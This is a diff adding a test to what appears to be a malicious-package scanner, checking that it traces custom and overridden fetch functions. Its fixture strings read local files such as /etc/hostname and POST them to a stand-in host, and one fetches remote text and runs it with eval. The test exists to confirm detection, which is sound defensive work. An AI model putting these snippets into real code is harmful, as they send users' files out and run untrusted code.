@@ -247,3 +247,48 @@ test("RequestBin by its host names only: requestBinary() is not an address", () 
   assert.deepEqual(onImport(beacon, "py"),
     [["sends the machine's user or host name to a data-capture service (requestbin.net)"], "CRITICAL"]);
 });
+
+test("a fetch through a fallback from a parameter keeps unknown startup readings (D-21)", () => {
+  // the platform's fetch, and a helper's `customFetch ?? fetch` (inspect-ai's view), were found by name to be a
+  // function of the script's called `fetch` too, so the tree's call returned what it was given. Reworked after an
+  // independent review: local checks keep unknown startup returns (Python twin: FetchFallbackTests)
+  const store = "class Store { fetch(k) { return k; } }\n";
+  const SEND = "  https.request('https://collect.invalid/c', { method: 'POST' }).end(v);\n";
+  const sent = (what) => [`reads files outside the package and sends them over the network (${what})`];
+  const risk = (text) => installScriptRisk(text, true, false, "js");
+  const helper = (sig, pick, defs = "", call = "get('/data/list')") => "const https = require('https');\n" + defs
+    + `async function get(u, ${sig}) {\n  const fetchFn = ${pick};\n  const r = await fetchFn(u);\n  return r.text();\n}\n`
+    + `async function go(reader) {\n  const body = await ${call};\n  const v = await reader.readFile(body);\n` + SEND
+    + "}\ngo(globalThis.zip);\n";
+  for (const [sig, pick] of [["c", "fetch"], ["customFetch", "customFetch ?? fetch"], ["customFetch", "customFetch || fetch"],
+    ["opts = {}", "opts.fetch ?? globalThis.fetch"], ["{ customFetch } = {}", "customFetch ?? fetch"]]) {
+    assert.deepEqual(risk(helper(sig, pick, store)), sent("/data/list"), pick);
+  }
+  // a fetch the code puts on the global object is what the call reaches (the review's HIGH-1)
+  const top = "const fs = require('fs');\nconst https = require('https');\n";
+  for (const install of ["globalThis.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+    "window.fetch = function (p) { return fs.readFileSync(p, 'utf8'); };\n", "global.fetch = (p) => fs.readFileSync(p, 'utf8');\n",
+    "self.fetch = (p) => fs.readFileSync(p, 'utf8');\n", "Object.assign(globalThis, { fetch: (p) => fs.readFileSync(p, 'utf8') });\n",
+    "Object.defineProperty(globalThis, 'fetch', { value: function fetch(p) { return fs.readFileSync(p, 'utf8'); } });\n"]) {
+    const text = top + install + "function go() {\n  const v = fetch('/etc/hostname');\n" + SEND + "}\ngo();\n";
+    assert.deepEqual(risk(text), sent("/etc/hostname"), install);
+  }
+  assert.deepEqual(risk(helper("customFetch", "customFetch ?? fetch", store + "globalThis.fetch = (k) => k;\n")), sent("/data/list"));
+  // an options object of the code's own: an instance, a class's static method, a member defined, entries (HIGH-2)
+  for (const [defs, call] of [["class Src { fetch(k) { return k; } }\n", "get('/data/list', new Src())"],
+    ["class Src { static fetch(k) { return k; } }\n", "get('/data/list', Src)"],
+    ["const d = {};\nObject.defineProperty(d, 'fetch', { value: function fetch(k) { return k; } });\n", "get('/data/list', d)"],
+    ["const mine = function fetch(k) { return k; };\n", "get('/data/list', Object.fromEntries([['fetch', mine]]))"],
+    ["", "get('/data/list', { fetch: (k) => k })"]]) {
+    assert.deepEqual(risk(helper("opts", "opts.fetch ?? globalThis.fetch", defs, call)), sent("/data/list"), call);
+  }
+  // not proven what the parameter or the global holds: the reading by name stands, as 01f8e6b read it
+  for (const [defs, call] of [["function readList(k) { return k; }\n", "get('/data/list', readList)"],
+    ["const s = new Store();\n", "get('/data/list')"]]) {
+    assert.deepEqual(risk(helper("customFetch", "customFetch ?? fetch", store + defs, call)), sent("/data/list"), call);
+  }
+  // and what the fallback receives is received
+  const load = store + "function load(customFetch) {\n  const fetchFn = customFetch ?? fetch;\n"
+    + "  return fetchFn('https://files.invalid/p').then((r) => r.text()).then((t) => eval(t));\n}\nload();\n";
+  assert.ok(risk(load).includes("runs code it receives over the network"));
+});
